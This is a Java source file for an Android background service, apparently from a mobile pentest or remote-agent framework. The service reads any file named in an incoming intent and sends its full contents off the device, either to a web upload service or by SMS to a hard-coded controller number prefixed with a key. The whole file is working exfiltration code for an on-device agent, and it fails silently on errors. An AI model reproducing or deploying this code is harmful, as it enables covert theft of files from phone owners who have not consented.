package com.bulbsecurity.framework;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

public class Upload extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	public void onStart(Intent intent, int startID) {
		String sms = "SMS";
		String web = "WEB";
		//String ret = intent.getStringExtra("returnmethod");
		String ret = "WEB";
		String file = intent.getStringExtra("file");
		File file2 = new File(file);
		String text = "";

		try {
		    BufferedReader br = new BufferedReader(new FileReader(file));
		    String line;

		    while ((line = br.readLine()) != null) {
		        text = text.concat(line);
		        text = text.concat("\n");
		    }
		    
			if (ret != null)
			{
				 
				if (ret.equals(sms))
				{

			        
					Intent intent3 = new Intent(getApplicationContext(),SMSService.class);
					//String number2 = ((AndroidAgent)this.getApplication()).getcontrolNumber();
					//String key = ((AndroidAgent)this.getApplication()).getkey();
					String key = getApplicationContext().getResources().getString(R.string.key);
					String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
					String first = key.concat(" ");
					String smsss = first.concat(text);
					intent3.putExtra("number", number2);
					intent3.putExtra("message", smsss);
					Context context = getApplicationContext();
					context.startService(intent3);
					
				}
				else if (ret.equals(web))
				{
					Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
					intent2.putExtra("uploadstring", text);
					Context context = getApplicationContext();
					context.startService(intent2);
				}
				
			}
		}
		catch (Exception e) {
		    //You'll need to add proper error handling here
		}

	}

}

